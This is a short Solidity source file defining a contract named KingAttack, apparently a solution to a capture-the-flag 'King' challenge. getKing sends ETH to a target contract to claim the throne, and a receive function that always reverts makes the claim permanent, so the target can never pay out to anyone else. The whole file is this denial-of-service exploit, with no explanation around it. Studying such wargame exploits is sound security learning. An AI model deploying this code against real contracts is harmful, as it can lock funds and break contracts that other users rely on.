// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract KingAttack {
    function getKing(address king) public payable {
        (bool success, ) = payable(king).call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        require(false, "I am the king");
    }
}